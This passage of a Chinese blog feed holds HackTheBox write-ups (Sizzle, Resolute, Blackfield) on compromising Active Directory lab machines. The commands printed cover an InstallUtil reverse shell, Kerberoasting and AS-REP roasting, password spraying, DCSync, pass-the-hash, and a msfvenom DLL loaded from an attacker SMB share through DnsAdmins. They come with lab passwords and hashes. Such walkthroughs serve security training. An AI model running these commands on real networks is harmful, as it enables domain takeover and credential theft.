src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715193810763-1805696027.png" alt="image-20240715193810323"></p><p>去<code>Users</code>目录查看信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715194308226-560865564.png" alt="image-20240715194307427"></p><p>发现有还有<code>sizzler</code>和<code>mrlky</code>用户，但是权限太低，看不了相关信息</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715194339783-1164341773.png" alt="image-20240715194338217"></p><p><code>Get-AppLockerPolicy -Effective -XML</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715202041953-1069118467.png" alt="image-20240715202034344"></p><p>发现还有<code>AppLocker</code>限制</p><h2 id="BypassCLM"><a href="#BypassCLM" class="headerlink" title="BypassCLM"></a>BypassCLM</h2><p>首先就是突破<code>powershell</code>约束语言模式，查找发现使用 PSByPassCLM 可突破<code>powershell</code>约束语言模式</p><p>工具下载地址：<a href="https://github.com/padovah4ck/PSByPassCLM">PSByPassCLM</a></p><p>因为之前传文件会有报错，所以先在本机开个<code>python</code>的<code>http</code>服务</p><p><code>python3 -m http.server 80</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715203400670-1053471516.png" alt="image-20240715203359069"></p><p>在机器上执行如下命令即可将本地文件下载到机器上</p><p><code>wget http://10.10.14.28/PsBypassCLM.exe -OutFile PsBypassCLM.exe</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715203545502-881304560.png" alt="image-20240715203537943"></p><p>同时在本地开启监听服务</p><p><code>nc -lvp 8888</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715204058957-49124056.png" alt="image-20240715204055299"></p><p>靶机上利用<code>PsBypassCLM</code>执行命令绕过<code>CLM</code>完成反弹shell</p><p><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.28 /rport=8888 \users\amanda\Documents\PsBypassCLM.exe</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715204845934-1212222572.png" alt="image-20240715204844560"></p><p>反弹shell成功，并且成功突破了<code>powershell</code>约束语言模式</p><h2 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h2><p>在新的会话中查看端口开放情况</p><p><code>netstat -ano</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715205626202-1739744831.png" alt="image-20240715205624669"></p><p>发现在之前扫描端口的时候并没有扫描到88端口，说明该端口可能已被防火墙屏蔽，但是在机器上开放了88端口，，所以我们可以使用<code>Kerberoast</code>，在这之前需要获取<code>Kerberoast</code></p><p>这里使用<code>Rubeus</code>工具来获取</p><ul><li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li></ul><p>该工具需要自己编译<code>C#</code>来生成<code>exe</code>文件</p><p>同样利用<code>`python</code>的<code>http</code>服务将<code>exe</code>上传至靶机</p><p><code>wget http://10.10.14.28/Rubeus.exe -outfile Rubeus.exe</code></p><p>在新的会话窗口中运行命令</p><p><code>.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716100921540-393901722.png" alt="image-20240716100917944"></p><p>发现还有问题，多半是由<code>AppLocker</code>限制导致的，所以还需要绕过<code>AppLocker</code>限制</p><h2 id="Bypass-AppLocker"><a href="#Bypass-AppLocker" class="headerlink" title="Bypass-AppLocker"></a>Bypass-AppLocker</h2><p>这里给一个不受<code>APPLocker</code>中<code>PowerShell</code>约束语言模式影响的路径</p><p>打印机驱动程序目录：<code>C:\Windows\System32\spool\drivers\color\</code></p><p>将<code>Rubeus.exe</code>传到这个目录下再执行命令</p><p><code>.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716113734989-1612727273.png" alt="image-20240716113730945"></p><p>现在我们拿到了<code>mrlky</code>用户的<code>TGS</code>票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle@HTB.LOCAL*$303273AECC274ADF0D56393740ECBF1F$CC9D7AF049DFFC407CBA5AD753429F1609BD82F56372EEBD77C3E3C06CBA802DF56DFA81F043B7CEB4CA8F62FF7CF10BBE5F7EA6F8D48DC23CAD4B02D22842B816B5AB44682EA9AF1719015B23880E96C7DC98FE7F17DFA225EDDD357FBD7DF7479E6E16D08DF2EAD8576D726686D53AE8A10AF784A5A5C0E6686C48B9C1A34EE886C5114DBE1A889C0EB5FC79DDD9AE74EFDC1D61FC3828EE1B95E160A575453D1A2ABE6B140ECBE41DC055329CD54EEF9797D4276384EF73A6C531121476117FCC6633777D871397F553D04BF3ACE929B4F7D7BDC1287E7398D1023C4424D8DF0B143C4D3C6A4EEC295A09C41214CD08E692A2DFD602D5F3673932AA146A06B423C3A31F8F4D5F1AB64A0E64CABA76AC7D52207EEB32EC2AB7943237A3BFCC1F5A196182F7FE40A4BB237F31D54E231E9C8E8D12D22FCA1FAEB7DD30AF193EC1D73D7C057C0FCC0725F2FCF6A04C46AF3E776828AE29452B4DD9292F607082B93F13D3EF71F9AE488BE3903EA8A36A7F167626E758D2E949A5300C6E3A467152BA5D1339B2F1EB2DB221481B1B0C2C0716D2339970E081D83A8CF083DEFFA835DAF5A98AE975094DC352FCE733D6FF58336C7A44890ED844D391876B4C85CBED748D310B81B5ED4BF89C184941D4F9623A6F1BF1A94290F9D5D5189B014BFFC48F21788DAE22A7841D716E95E4B576277C80690FFBB49AE8B218DBFF6C540CE815B5AAAEC1E838719048886ACDC539A637DF26DFB4F21FDACE84D247C789B381F3381CBC21D319A0C19AB24187B96C4B7EC2DC009E3CE13DBD4E41561F26FAB3D9222622AD4F072454F247557E0AA2A9DD1C9574707A2AC3BE27B913B8B1387404109A1050619ACD87812566D324C0836934E05760F426872FAF5E24D6F076AE0C1225E8DF9B2102105ED275F8EB8C312150D418044F841684F56A70F07A07FC6B5417D3B4D44E3518DD11A8273E7DD006F03643F5766719034C54FEC044A7DA375F2219710CC5A3F0A2E4E721FB6F3A7AA3F20126836BB2120FCBDA4FF995C2DC84AECF736BD326B898171405DFBA5833D0563A8E211AB5F198D154A9C98DEF8335BB71CEC3810295F406C14AB98051F2A8E181FBA1FF712208316284254F854FB7E98954B1D8CA3B5360CB7FC7A1FA63FAF60A3D7516C90FAC94345862E2E2278E27B7131A6FE3D2529FA8B9694BD377401C185DF01EEBDD65E1B46C57B949CBB550F4FE14395EF75033EF319D2BEDC7B3D1F81E8C850A71DB696A33840C950C032C9B337543D0F0A28F1CD1B78897CABB3219497FDF7BBB5ED4D0F340A8D34EC14176F71D214C6BBB402824DD29101F819610A21405C3A0292E62C494758D0723716188</span><br></pre></td></tr></table></figure><h2 id="NTLM哈希破解"><a href="#NTLM哈希破解" class="headerlink" title="NTLM哈希破解"></a>NTLM哈希破解</h2><p>将上述<code>hash</code>值保存到文件<code>spn-hash</code>中，使用<code>john</code>爆破</p><p><code>john spn-hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716114611543-2034764138.png" alt="image-20240716114607870"></p><p><code>john spn-hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716114618446-173345972.png" alt="image-20240716114615195"></p><p>这样就拿到了<code>mrlky</code>的明文密码：<code>Football#7</code></p><h2 id="evil-winrm证书登录"><a href="#evil-winrm证书登录" class="headerlink" title="evil-winrm证书登录"></a>evil-winrm证书登录</h2><p>正常登录<code>evil-winrm</code>还是登录不了，跟之前一样，利用<code>web</code>页面生成证书，拿证书登录</p><p>首先使用 <code>openssl</code>创建<code>mrlky</code>的<code>CSR</code>和密钥</p><p><code>openssl req -newkey rsa:2048 -nodes -keyout mrlky.key -out mrlky.csr</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716141451172-153851049.png" alt="image-20240716141446345"></p><p>重复之前的操作最终会得到一个新的证书</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716141839775-1368628577.png" alt="image-20240716141836559"></p><p>这里为了跟之前的证书区分开来，就换了个名字<code>mrlkynew.cer</code>，但是不影响登录</p><p><code>evil-winrm -c mrlkynew.cer -k mrlky.key -i 10.10.10.103 -u mrlky -p Football#7 -S</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716142040045-2006970951.png" alt="image-20240716142036513"></p><p>登陆成功</p><p>现在登陆的是<code>mrlky.HTB</code>用户，在他的桌面上并没有我们想要的东西。通过查看用户发现，还有一个<code>mrlky</code>的用户，最后在<code>mrlky</code>的<code>Desktop</code>上找到<code>user.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716142441255-381007509.png" alt="image-20240716142438044"></p><h1 id="AD域提权"><a href="#AD域提权" class="headerlink" title="AD域提权"></a>AD域提权</h1><h2 id="Python-Bloodhound信息搜集"><a href="#Python-Bloodhound信息搜集" class="headerlink" title="Python-Bloodhound信息搜集"></a>Python-Bloodhound信息搜集</h2><p><code>bloodhound-python -c all -u mrlky -p Football#7 -d htb.local -ns 10.10.10.103</code></p><p>得到的文件拿<code>bloodhound</code>打开分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240715192108385-865177832.png" alt="image-20240715192107875"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716143122067-946821219.png" alt="image-20240716143118655"></p><p>发现<code>mrlky</code>有<code>GetChangesALL</code>权限可以直接进行<code>dcsync</code>攻击</p><h2 id="DCSync攻击"><a href="#DCSync攻击" class="headerlink" title="DCSync攻击"></a>DCSync攻击</h2><p><code>python3 /usr/share/doc/python3-impacket/examples/secretsdump.py mrlky:Football#7@10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716144053985-1944936331.png" alt="image-20240716144050521"></p><p>拿到<code>Administrator</code>的<code>hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267</span><br></pre></td></tr></table></figure><h2 id="PTH传递攻击登录管理员"><a href="#PTH传递攻击登录管理员" class="headerlink" title="PTH传递攻击登录管理员"></a>PTH传递攻击登录管理员</h2><p>拿到了管理员的<code>hash</code>，就可以通过<code>wmiexec</code>哈希传递拿到管理员用户的权限</p><p><code>python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716144324075-1639180140.png" alt="image-20240716144320564"></p><p>成功拿到管理员权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240716144519997-1994691611.png" alt="image-20240716144516769"></p><p>最后也是在<code>Desktop</code>上找到<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Windows </tag>
            
            <tag> Active Directory 101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Resolute</title>
      <link href="/posts/6134d881.html"/>
      <url>/posts/6134d881.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.169</p></blockquote><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>密码喷洒</li><li>利用DnsAdmins提权</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>拿<code>nmap</code>扫一下</p><p><code>nmap -sS -sV -sC 10.10.10.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712152502867-231239340.png" alt="image-20240712152500615"></p><p>分析发现有<code>DNS</code>服务、<code>kerberos</code>服务、<code>ldap</code>服务、<code>smb</code>服务，域名为<code>megabank.local</code></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>简单测试一下</p><p><code>smbclient -L //10.10.10.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712152804340-1683391527.png" alt="image-20240712152802524"></p><p>匿名登陆成功但是没什么有用的信息</p><h2 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h2><p><code>ldapsearch -H ldap://10.10.10.169:389 -x -s base -b &quot;&quot; namingcontexts</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712153256941-2017644621.png" alt="image-20240712153255680"></p><p>也没啥有用信息</p><h2 id="RPC"><a href="#RPC" class="headerlink" title="RPC"></a>RPC</h2><p>利用RPC远程过程调用枚举用户</p><p><code>rpcclient -U &quot;&quot; -N 10.10.10.169</code></p><p>枚举用户</p><p><code>enumdomusers</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712153719898-11121245.png" alt="image-20240712153719000"></p><p>显示用户详细列表信息</p><p><code>querydispinfo</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712155153559-329641798.png" alt="image-20240712155152658"></p><p>找到用户名密码：<code>marko : Welcome123!</code></p><p>尝试<code>rpcclient</code>和<code>smbclient</code>登录</p><p> <code>smbclient -U marko -L //10.10.10.169</code></p><p><code>rpcclient -U marko -N 10.10.10.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712161106863-713337375.png" alt="image-20240712161105981"></p><p>都失败了。</p><h1 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h1><p>既然<code>marko</code>用户登录不上，不妨拿这个密码去试试其他的用户，利用<code>crackmapexec</code>工具尝试密码喷洒攻击</p><p>先将之前通过<code>rpcclient</code>的<code>enumdomusers</code>命令拿到的用户名列表保存为<code>users</code></p><p>写个<code>python</code>脚本将其提取到<code>users.txt</code>中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开uusers.txt文件进行读取</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;users&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> infile:</span><br><span class="line">    lines = infile.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开user.txt文件进行写入</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;users.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> outfile:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="comment"># 使用正则表达式匹配user后面的用户名</span></span><br><span class="line">        <span class="keyword">import</span> re</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">r&#x27;user:\[(.*?)\]&#x27;</span>, line)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">            username = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">            <span class="comment"># 将用户名写入user.txt文件中</span></span><br><span class="line">            outfile.write(username + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712162109450-1203669142.png" alt="image-20240712162108457"></p><p>使用<code>crackmapexec</code>进行密码喷洒</p><p><code>crackmapexec smb 10.10.10.169 -u ./users.txt -p Welcome123!</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712162354838-1404006531.png" alt="image-20240712162353688"></p><p>发现<code>melanie</code>用户可以登录，使用<code>evil-winrm</code>登录</p><p><code>evil-winrm -i 10.10.10.169 -u melanie -p Welcome123!</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712162935023-164823517.png" alt="image-20240712162933792"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712163206748-1443376353.png" alt="image-20240712163205922"></p><p>在<code>Desktop</code>上找到<code>user.txt</code></p><h1 id="AD域提权"><a href="#AD域提权" class="headerlink" title="AD域提权"></a>AD域提权</h1><h2 id="BloodHound信息搜集"><a href="#BloodHound信息搜集" class="headerlink" title="BloodHound信息搜集"></a>BloodHound信息搜集</h2><p>将<code>SharpHound.exe</code>传上去运行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712175809715-202073680.png" alt="image-20240712175808679"></p><p>将结果<code>zip</code>下载下来，拿<code>bloodhoun</code>分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712181220147-1222680155.png" alt="image-20240712181218798"></p><p>点击<code>Find Shortest Paths to Domain Admins</code>后，发现当前用户没有什么明显利用的点，但是发现在这个域中还有一个<code>ryan</code>用户，但是不知道密码，只能从当前<code>melanie</code>用户入手了</p><h2 id="查看Powershell日志文件获得用户名密码"><a href="#查看Powershell日志文件获得用户名密码" class="headerlink" title="查看Powershell日志文件获得用户名密码"></a>查看Powershell日志文件获得用户名密码</h2><p>查找可疑文件时，在<code>C:/</code>目录下运行<code>ls -force</code>命令后发现如下结果：<br><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712181552664-103691626.png" alt="image-20240712181551586"></p><p>其中<code>PSTranscripts</code>有点可疑，该英文直译是<code>PS传输脚本</code>，仔细查看一下这个目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712182039819-759817632.png" alt="image-20240712182037742"></p><p>在<code>C:\PSTranscripts\20191203</code>目录下找到<code>PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</code>文件，该文件可能是<code>Powershell</code>的日志之类的文件，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712182643667-1606404044.png" alt="image-20240712182642485"></p><p>这里貌似是<code>ryan</code>用户的用户名和密码，尝试登陆下</p><p><code>evil-winrm -i 10.10.10.169 -u ryan -p &#39;Serv3r4Admin4cc123!&#39;</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712182823693-1043454332.png" alt="image-20240712182822459"></p><p>登录成功</p><h2 id="利用DnsAdmins提权"><a href="#利用DnsAdmins提权" class="headerlink" title="利用DnsAdmins提权"></a>利用DnsAdmins提权</h2><p>在桌面发现<code>note.txt</code>文件，内容如下：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712183132981-1610553881.png" alt="image-20240712183131938"></p><p>翻译过来就是</p><blockquote><p>发送给团队的电子邮件：</p><p>- 由于更改冻结，任何系统更改（除了对管理员帐户的更改）都将在1分钟内自动恢复</p></blockquote><p>在查看<code>bloodhound</code>的过程中发现下面情况：</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712191138799-215220281.png" alt="image-20240712191130338"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240712191145783-1038194011.png" alt="image-20240712191143991"></p><p>发现<code>ryan</code>用户属于<code>contractors</code>组，而<code>contractors</code>组又属于<code>dnsadmins</code>组，所以<code>ryan</code>用户属于<code>dnsadmins</code>组</p><p>就可以利用 <code>DnsAdmins</code>权限进行<code>AD</code>域提权</p><blockquote><p><code>DNSAdmins</code>组的成员可以访问网络 <code>DNS</code> 信息。默认权限如下： 允许：读取、写入、创建所有子对象、删除子对象、特殊权限。</p><p>dnsadmins 组的成员可用于通过 <code>dll</code> 注入将权限提升到管理员。</p><p><a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">参考链接</a></p></blockquote><p>首先使用<code>msf</code>生成<code>dll</code>文件，将<code>dll</code>文件传到机器上</p><p><code>msfvenom -p windows/x64/exec cmd=&#39;net user administrator abc123! /domain&#39; -f dll &gt; evil.dll</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714143409907-1507824470.png" alt="image-20240714143407217"></p><p>因为正常<code>upload</code>传文件会被杀掉，这里考虑使用<code>smb</code>传文件</p><p><code>python3 /usr/share/doc/python3-impacket/examples/smbserver.py share ./</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714134946085-1345920374.png" alt="image-20240714134943265"></p><p>在靶机上的<code>ps</code>里头执行</p><p><code>cmd /c dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.14.28\share\evil.dll</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714135422509-753045836.png" alt="image-20240714135419626"></p><p>接着执行如下命令重启<code>dns</code>服务</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc.exe stop dns</span><br><span class="line">sc.exe <span class="built_in">start</span> dns</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714140456936-991048758.png" alt="image-20240714140453914"></p><p>此时，之前利用<code>python</code>起的<code>smbserver</code>服务会收到回显</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714140731885-1692805194.png" alt="image-20240714140729094"></p><p>最后利用<code>psexec.py</code>登录，输入密码</p><p><code>python3 /usr/share/doc/python3-impacket/examples/psexec.py megabank.local/administrator@10.10.10.169</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714143554332-1195939730.png" alt="image-20240714143551441"></p><p>最后在<code>Administrator</code>的<code>Desktop</code>找到<code>root.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240714144241216-9787929.png" alt="image-20240714144237322"></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Windows </tag>
            
            <tag> Active Directory 101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB-Blackfield</title>
      <link href="/posts/82db38f4.html"/>
      <url>/posts/82db38f4.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.10.192</p></blockquote><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ul><li>AS-REP Roasting</li><li>ForceChangePassword权限滥用实现横向移动</li><li>利用Lsass内存捕获文件提取用户hash</li><li>利用SeBackupPrivilege权限进行NTDS.dit卷影拷贝实现权限提升</li><li>使用wmiexec进行PTH</li></ul><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap -sS -sV -sC 10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240709112314494-548401534.png" alt="image-20240709112312857"></p><p>有<code>DNS</code>服务，<code>kerberos</code>服务，<code>LDAP</code>服务，<code>SMB</code>服务，域名<code>BLACKFIELD.local</code></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>直接尝试一手匿名登录</p><p><code>smbclient -L \\10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710104225686-281558305.png" alt="image-20240710104224727"></p><p>发现得到一些共享资源，尝试获取<code>profiles$</code>资源</p><p><code>smbclient //10.10.10.192/profiles$</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710111357853-1171589590.png" alt="image-20240710111356614"></p><p>发现一些使用者的名称，将每条带名字的数据保存到<code>users.txt</code>中，写个脚本将其保存到<code>user.txt</code>中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;users.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    data = file.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用正则表达式提取姓名部分</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;^\s*(\S+)&#x27;</span>, re.MULTILINE)</span><br><span class="line">names = pattern.findall(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将提取的姓名保存到新文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;user.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> names:</span><br><span class="line">        output_file.write(name + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;提取的数据已保存到 &#x27;user.txt&#x27; 文件中。&quot;</span>)</span><br></pre></td></tr></table></figure><p>这样就获得了一个基本的用户列表</p><h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>利用<code>ldapsearch</code>搜索</p><p><code>ldapsearch -H ldap://10.10.10.192:389 -x -s base -b &quot;&quot; namingcontexts</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710113255598-1728367252.png" alt="image-20240710113254757"></p><p>得到两个域名</p><blockquote><p><code>DomainDnsZones.blackfield.local</code></p><p><code>ForestDnsZones.blackfield.local</code></p></blockquote><h1 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h1><p>拿到了用户名，这里又暴露了<code>kerberos</code>端口88。尝试一下<code>AS-REP Roasting</code>攻击</p><p><code>python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py BLACKFIELD.local/ -usersfile user.txt  -dc-ip 10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710114412279-965573907.png" alt="image-20240710114411468"></p><p>拿到一个<code>support</code>用户的<code>hash</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$support@BLACKFIELD.LOCAL:8e8fcfa24b77dd8ed4e22771a99640c3$937ed6b20ebfcdbc0a07e975d271f8a18d88e0dfc6b774da9184de540c6847c9adeb2b5615a2f99e06235064c420c621ae3b2bc0cf78ebe3047b7004d1dcfac74bc582fc68c3fa0cf0244920cfceab53cee3e91fc049bbef7efa1584041389ae19d317ab6bfb5c0df0eb4703fbe66367f12999d756d9400e971ab0b6d8993c267a606359303d2f4dfc54ae40b819c613e8e6281a91cec5d22aef09304a696cb9b43a4555ce0dbfe860a16bb83ea715eceabee93327ad337799f0f5153e91e924df1624e3458201312cd6a4bc1d4999dd9b0cc2a4ea3406f78836240ef70c1982911fd13e8f45c3c4f36c28781133df608f33d801</span><br></pre></td></tr></table></figure><p>使用<code>john</code>进行破解</p><p>将上述票据保存为<code>hash</code>，使用<code>john</code>爆破<code>hash</code>值</p><p><code>john hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><code>john hash -show</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710114627581-651420839.png" alt="image-20240710114626394"></p><p>拿到用户名密码：<code>support : #00^BlackKnight</code></p><p>但是<code>evil-winrm</code>登陆不了，无法通过<code>BloodHound.exe</code>进行信息收集，但是可以使用<code>Python</code>版的<code>BloodHound</code>信息收集，实现了不需要登录即可完成信息收集的功能</p><h1 id="AD域渗透"><a href="#AD域渗透" class="headerlink" title="AD域渗透"></a>AD域渗透</h1><h2 id="Python版Bloodhound-信息搜集"><a href="#Python版Bloodhound-信息搜集" class="headerlink" title="Python版Bloodhound-信息搜集"></a>Python版Bloodhound-信息搜集</h2><p>使用之前获得的用户和密码，通过<code>bloodhound</code>进行信息搜集</p><p><code>bloodhound-python -c all -u support -p &#39;#00^BlackKnight&#39; -d blackfield.local -ns 10.10.10.192</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710150153628-249598852.png" alt="image-20240710150152607"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710150205848-1098348644.png" alt="image-20240710150201795"></p><p>得到一些文件，导入<code>bloodhound</code>分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202407/3051266-20240710152322259-467189056.png" alt="image-20240710152321163"></p><p>点击<code>First Degree Object 